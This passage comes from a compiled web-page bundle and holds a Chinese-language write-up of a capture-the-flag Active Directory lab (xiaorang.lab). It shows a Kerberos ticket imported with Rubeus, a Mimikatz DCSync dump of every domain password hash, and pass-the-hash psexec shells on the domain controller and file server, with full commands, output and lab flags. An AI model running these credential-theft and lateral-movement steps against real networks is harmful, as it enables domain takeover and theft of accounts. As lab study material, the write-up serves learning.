511be1f8053c22c147fe774e84f6cfa0\n    09  5cd37846466bba0ab01d0a4fb8fd421a\n    10  5c90774e68ba65b15563d817ea03be1d\n    11  1aa618d4990ce0b031f56c35b00ef135\n    12  511be1f8053c22c147fe774e84f6cfa0\n    13  385ea61fafea315b384cff461b9e114c\n    14  ee5a115e84919b46e718c6c4294dba78\n    15  729b4c3a8edab7f12e037ec161293f44\n    16  e3ff26cc0629c51fc68f18ce47173f45\n    17  bd6d0bafad3f99c28a9a18d9e5351763\n    18  359507105fa376c918a80f7fb982446a\n    19  20ad44fe17377c5f3815358c33ca7c34\n    20  330fb8b3848b024ba40a8cef987d6795\n    21  ec544c990f343fe338a4667f3791e5ab\n    22  d528c47b4f30acdeb5bf49f49fed7d64\n    23  41bb0903f6c2129f27bfa06e6d9b186b\n    24  b5c4fc8c656c14829c0da25e0852582a\n    25  8bba781aff9bb5e7939f73c216d0e750\n    26  d3bb8972f7c7ffbc5b22392125c4e21f\n    27  dd97e0d53b5d1ae346029810cf74d0b8\n    28  0c084ded5672573ee7c4127ab474f930\n    29  c922d791de366eedeb97c1bd0798d6ff\n"})}),"\n",(0,s.jsx)(n.h2,{id:"17222445-xiaorangwin19-\u5bfc\u5165\u7968\u636e\u76f4\u63a5-dcsync-\u83b7\u53d6\u57df\u5185\u54c8\u5e0c",children:"172.22.4.45 XIAORANG\\WIN19 \u5bfc\u5165\u7968\u636e\u76f4\u63a5 DCSync \u83b7\u53d6\u57df\u5185\u54c8\u5e0c"}),"\n",(0,s.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"Rubeus"})," \u5bfc\u5165\u7968\u636e"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"PS C:\\Users\\randark\\Desktop> .\\Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD5aZsYI9Sw2W6J+rVNw+77PB+2CdipSyfMJuMYJuep25IVTVTASjwKCfMgBjw0UjoQHMrTZmXdiQD5RBKogFn3zkQgqUUSTHMkjtN5/97EcrNuobYOEYByCcJDJVNVFYpF4BHvOwT1oW9tfRNK8YGcKSwSTyIITkeLbukhwym5CbYgiy//zubFVQTkR31cokGPtkuPfBt5lI27xMKhxQ1Ij59EQHGoYOIJBrO2Lvc0UCD19aVHq2Qqf/dqaYwUZ2q/YhEnby/ws/dCfZlWpPJK/pgDErh9ibcsEABDvV8Rhm833Yc8jIPf8J8DKFKFAfl80ZnxRwTLTXIKR3fpj0kFWg3pSApolh4SY3PiW7k9X9fuK+4LI8TuH5ZK47MAafUMvByyGYZwJ3Yrar0m99ia9JLn3jrX6Qk4LpK3VJppuNlN+gwMC9/mYlGyjlXCBZgZCnalbgNUlRFdvqHZBettxrYugDGGYErhKWt/XtLPW4fvA2FkscK8wm0N1/o0GcdhD/Oy2f+Symu57vNZoQvUqoKVPlbt7ccF6V9BLQoGuIr831JrMDLXGdPChV+qBRe9ErHUKFTZb4o02Q22gxltkltpprYBNprl9mS9FWWycGDO7e6wYGrYTFxFaHwUL7U+TY3OiYucHTzUWh1cauxjYchJBZqI7oOe0MW9IdJ6OkFSK1IpGlPr0WgEpG5RBN1pYvap4H/zHzpR4DvUvJezoJNEZJ8050+3PujeDGV9RRQTkMema+LGyefR3yKe88yiJ+xu+dZI4GWfj96vlQ0wphmm8/ysUMUG9OOfwS8rk98qP0SplwsuCdyvXQxGZOOA9/RPeMgV0KBJwcociO2FRykFL7GVexVJ62Wtl/UY9WqCpBTr44A9gvR92si7gNJdIdHf1AvTSD3xlHOWqYC6E/sFBU6BMjmoFDycK9wmcr1qpg/n3Zm+EnsMb5LLEL3VlK413NadraLP+/mA1CtrQQgSCoWP5uGTwzD/4e64IqgVbt0QrZdQspmd9UsiIX97vxVrTY2Ca4UObnl0LSJc2gUVnP3qSm5J4AXEQRNzI+0m40KshstoIz1dsJp/YVcze+DLeH6HbkFqlTM8hUVok5M69guHXNtsavg2xnw/rjcU2/SyH8vnd4cQgbKirAb0BYt/sIS4wtiOtrbq0vr06c1L10xwkjfe4IC8pmCG6q9RADOn8n+SfFpXBkoSMFUyfqwf4DuS83703iBPG13ushLxWpDcDCxISd2uk8BlatFwNXGDL0IOJnESLseMvwX3Csw8+9PRDLWTIHrAr5a/Np/tZAT3yvh85XE26m6hLs7cGAFXH+m8cmkSws2lTDvERTgXm3uxojoe8sJh7PPBWaM0surxjtYL1JL+6RD6oH/S/2qmw/bFSIanrVM5dwCKblSkcKUKqMg8re4iQ74MqUY6dff2RGt5zldrqk6SjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCAkzDKS0dyBbUs2LWRfrMMsic4a1ZchdPHkd73Kcqxn96EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI0MDcyNDAwMTUxN1qmERgPMjAyNDA3MjQxMDE1MTdapxEYDzIwMjQwNzMxMDAxNTE3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.2.0\n\n\n[*] Action: Import Ticket\n[+] Ticket successfully imported!\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u7136\u540e\u4f7f\u7528 ",(0,s.jsx)(n.code,{children:"Mimikatz"})," \u76f4\u63a5 DCSync"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"PS C:\\Users\\randark\\Desktop> .\\mimikatz_trunk\\x64\\mimikatz.exe \"lsadump::dcsync /domain:xiaorang.lab /all /csv\" exit\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)\n ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             (vincent.letoux@gmail.com)\n  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\n[DC] 'xiaorang.lab' will be the domain\n[DC] 'DC01.xiaorang.lab' will be the DC server\n[DC] Exporting domain 'xiaorang.lab'\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n502     krbtgt  767e06b9c74fd628dd13785006a9092b        514\n1105    Aldrich 98ce19dd5ce74f670d230c7b1aa016d0        512\n1106    Marcus  b91c7cc463735bf0e599a2d0a04df110        512\n1112    WIN-3X7U15C2XDM$        c3ddf0ffd17c48e6c40e6eda9c9fbaf7        4096\n1113    WIN-YUUAW2QG9MF$        125d0e9790105be68deb6002690fc91b        4096\n1000    DC01$   0d7eae0ce200697f7751e5f6e8080ccf        532480\n500     Administrator   4889f6553239ace1f7c47fa2c619c252        512\n1103    FILESERVER$     ce6da0d051a2431e7a5456c0785a1c24        4096\n1104    WIN19$  22efd36d08f27afdf0628d9ba2bff827        528384\n\nmimikatz(commandline) # exit\nBye!\n"})}),"\n",(0,s.jsx)(n.h2,{id:"1722247-dc-\u4f7f\u7528-administrator-\u54c8\u5e0c\u767b\u5f55-dc",children:"172.22.4.7 DC \u4f7f\u7528 Administrator \u54c8\u5e0c\u767b\u5f55 DC"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/pocs]\n\u2514\u2500$ proxychains4 -q impacket-psexec xiaorang/Administrator@172.22.4.7 -hashes :4889f6553239ace1f7c47fa2c619c252 -codec gbk\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Requesting shares on 172.22.4.7.....\n[*] Found writable share ADMIN$\n[*] Uploading file SStvEKTx.exe\n[*] Opening SVCManager on 172.22.4.7.....\n[*] Creating service hYIt on 172.22.4.7.....\n[*] Starting service hYIt.....\n[!] Press help for extra shell commands\nMicrosoft Windows [\u7248\u672c 10.0.14393]\n(c) 2016 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002\n\nC:\\Windows\\system32> cd C:/Users/Administrator/flag\nC:\\Users\\Administrator\\flag> type flag04.txt\n ______   _______  _        _______  _______  _______ __________________ _______  _\n(__  \\ (  ____ \\( \\      (  ____ \\(  ____ \\(  ___)\\__   __/\\__   __/(  ___  )( (    /|\n| (\\)| (    \\/| (      | (    \\/| (    \\/| (   ) |   ) (      ) (   | (   ) ||  \\  ( |\n| |   ) || (__    | |      | (__    | |      | (___) |   | |      | |   | |   | ||   \\ | |\n| |   | ||  __)   | |      |  __)   | | ____ |  ___  |   | |      | |   | |   | || (\\ \\) |\n| |   ) || (| |      | (      | | \\_)| (   ) |   | |      | |   | |   | || | \\   |\n| (__/)| (____/\\| (____/\\| (____/\\| (___) || )   ( |   | |   ___) (___| (___) || )  \\  |\n(______/ (_______/(_______/(_______/(_______)|/     \\|   )_(   \\_______/(_______)|/    )_)\n\n\nAwesome! Now you have taken over the entire domain network.\n\n\nflag04: flag{6f4333a1-eed5-4bb4-9b6f-abdf55d0f67e}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"flag--04",children:"flag- 04"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:" ______   _______  _        _______  _______  _______ __________________ _______  _\n(__  \\ (  ____ \\( \\      (  ____ \\(  ____ \\(  ___)\\__   __/\\__   __/(  ___  )( (    /|\n| (\\)| (    \\/| (      | (    \\/| (    \\/| (   ) |   ) (      ) (   | (   ) ||  \\  ( |\n| |   ) || (__    | |      | (__    | |      | (___) |   | |      | |   | |   | ||   \\ | |\n| |   | ||  __)   | |      |  __)   | | ____ |  ___  |   | |      | |   | |   | || (\\ \\) |\n| |   ) || (| |      | (      | | \\_)| (   ) |   | |      | |   | |   | || | \\   |\n| (__/)| (____/\\| (____/\\| (____/\\| (___) || )   ( |   | |   ___) (___| (___) || )  \\  |\n(______/ (_______/(_______/(_______/(_______)|/     \\|   )_(   \\_______/(_______)|/    )_)\n\n\nAwesome! Now you have taken over the entire domain network.\n\n\nflag04: flag{6f4333a1-eed5-4bb4-9b6f-abdf55d0f67e}\n"})}),"\n",(0,s.jsx)(n.h2,{id:"17222419-fileserverxiaoranglab-\u57df\u5185\u6a2a\u5411",children:"172.22.4.19 FILESERVER.xiaorang.lab \u57df\u5185\u6a2a\u5411"}),"\n",(0,s.jsx)(n.p,{children:"\u65e2\u7136\u5df2\u7ecf\u6709\u4e86\u57df\u5185 Administrator \u7684\u51ed\u636e\uff0c\u76f4\u63a5\u62ff\u4e0b\u5269\u4e0b\u7684\u9776\u673a\u5373\u53ef"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/pocs]\n\u2514\u2500$ proxychains4 -q impacket-psexec xiaorang/Administrator@172.22.4.19 -hashes :4889f6553239ace1f7c47fa2c619c252 -codec gbk\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\n\n[*] Requesting shares on 172.22.4.19.....\n[*] Found writable share ADMIN$\n[*] Uploading file lUcduVKW.exe\n[*] Opening SVCManager on 172.22.4.19.....\n[*] Creating service TUsH on 172.22.4.19.....\n[*] Starting service TUsH.....\n[!] Press help for extra shell commands\nMicrosoft Windows [\u7248\u672c 10.0.14393]\n(c) 2016 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002\n\nC:\\windows\\system32> cd C:/Users/Administrator/flag\n\nC:\\Users\\Administrator\\flag> type flag03.txt\n   . .       . .       .         . .       . .       . .       . .    .    .       . .       . .\n.+'|=|`+. .+'|=|`+. .+'|      .+'|=|`+. .+'|=|`+. .+'|=|`+. .+'|=|`+.=|`+. |`+. .+'|=|`+. .+'|=|`+.\n|  | `+ | |  | `+.| |  |      |  | `+.| |  | `+.| |  | |  | |.+' |  | `+.| |  | |  | |  | |  | `+ |\n|  |  | | |  |=|`.  |  |      |  |=|`.  |  | .    |  |=|  |      |  |      |  | |  | |  | |  |  | |\n|  |  | | |  | `.|  |  |      |  | `.|  |  | |`+. |  | |  |      |  |      |  | |  | |  | |  |  | |\n|  |  | | |  |    . |  |    . |  |    . |  | `. | |  | |  |      |  |      |  | |  | |  | |  |  | |\n|  | .+ | |  | .+'| |  | .+'| |  | .+'| |  | .+ | |  | |  |      |  |      |  | |  | |  | |  |  | |\n`+.|=|.+'`+.|=|.+' `+.|=|.+'`+.|=|.+' `+.|=|.+'`+.| |..|      |.+'      |.+'`+.|=|.+' `+.|  |.|\n\n\n\nflag03: flag{0183dc6b-9724-47a8-a32b-8a06f4ea0ef6}\n\n\nHere is fileserver.xiaorang.lab, you might find something interesting on this host that can help you!\n"})}),"\n",(0,s.jsx)(n.h2,{id:"flag---03",children:"flag - 03"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"   . .       . .       .         . .       . .       . .       . .    .    .       . .       . .\n.+'|=|`+. .+'|=|`+. .+'|      .+'|=|`+. .+'|=|`+. .+'|=|`+. .+'|=|`+.=|`+. |`+. .+'|=|`+. .+'|=|`+.\n|  | `+ | |  | `+.| |  |      |  | `+.| |  | `+.| |  | |  | |.+' |  | `+.| |  | |  | |  | |  | `+ |\n|  |  | | |  |=|`.  |  |      |  |=|`.  |  | .    |  |=|  |      |  |      |  | |  | |  | |  |  | |\n|  |  | | |  | `.|  |  |      |  | `.|  |  | |`+. |  | |  |      |  |      |  | |  | |  | |  |  | |\n|  |  | | |  |    . |  |    . |  |    . |  | `. | |  | |  |      |  |      |  | |  | |  | |  |  | |\n|  | .+ | |  | .+'| |  | .+'| |  | .+'| |  | .+ | |  | |  |      |  |      |  | |  | |  | |  |  | |\n`+.|=|.+'`+.|=|.+' `+.|=|.+'`+.|=|.+' `+.|=|.+'`+.| |..|      |.+'      |.+'`+.|=|.+' `+.|  |.|\n\n\n\nflag03: flag{0183dc6b-9724-47a8-a32b-8a06f4ea0ef6}\n\n\nHere is fileserver.xiaorang.lab, you might find something interesting on this host that can help you!\n"})})]})}function o(e={}){const{wrapper:n}={...(0,i.a)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(l,{...e})}):l(e)}},49172:(e,n,a)=>{a.d(n,{Z:()=>s});const s=a.p+"assets/images/image_20240707-090703-6bcc2ddaa318af33a264d1d42e080a4b.png"},97181:(e,n,a)=>{a.d(n,{Z:()=>s});const s=a.p+"assets/images/image_20240711-091147-0dbb4f4f1bde592385c61a353847deea.png"},16417:(e,n,a)=>{a.d(n,{Z:()=>s});const s=a.p+"assets/images/image_20240713-091308-89528934ad37415ba104f77d5a1a93bd.png"},69277:(e,n,a)=>{a.d(n,{Z:()=>s});const s=a.p+"assets/images/image_20240716-081613-253eb2c828118f2b2c0154ddb9affda8.png"},93963:(e,n,a)=>{a.d(n,{Z:()=>s});const s=a.p+"assets/images/image_20240716-091617-04327f0194a11e0c332b629346fed179.png"},73944:(e,n,a)=>{a.d(n,{Z:()=>s});const s=a.p+"assets/images/image_20240718-081813-bd59109f7a1e37ad380dafe7125fee12.png"},96537:(e,n,a)=>{a.d(n,{Z:()=>s});const s=a.p+"assets/images/image_20240720-082053-f4c3a090060332ab2243858034bf7d1c.png"},11151:(e,n,a)=>{a.d(n,{Z:()=>d,a:()=>c});var s=a(67294);const i={},r=s.createContext(i);function c(e){const n=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function d(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:c(e.components),s.createElement(r.Provider,{value:n},e.children)}}}]);